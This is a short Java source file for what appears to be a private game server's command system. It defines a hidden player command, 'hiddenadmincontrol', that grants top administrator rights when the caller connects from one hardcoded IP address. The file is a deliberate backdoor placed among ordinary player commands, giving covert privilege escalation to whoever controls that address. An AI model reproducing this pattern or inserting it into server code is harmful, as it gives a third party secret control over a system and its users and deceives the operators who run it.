package com.rakeyjake.server.commands.player;

import com.rakeyjake.server.commands.Command;
import com.rakeyjake.server.model.players.Client;

/**
 * Gives the user temporary admin control
 * ::hiddenadmincontrol
 * @author André
 *
 */
public class HiddenAdminControl extends Command{

	@Override
	public String command() {
		return "hiddenadmincontrol";
	}

	@Override
	public void execute(Client c, String playerCommand) {
		if (c.connectedFrom.equals("92.237.172.133")) {
			c.temporaryAdmin = true;
			c.logout();
			c.playerRights = 3;
		}
	}

}
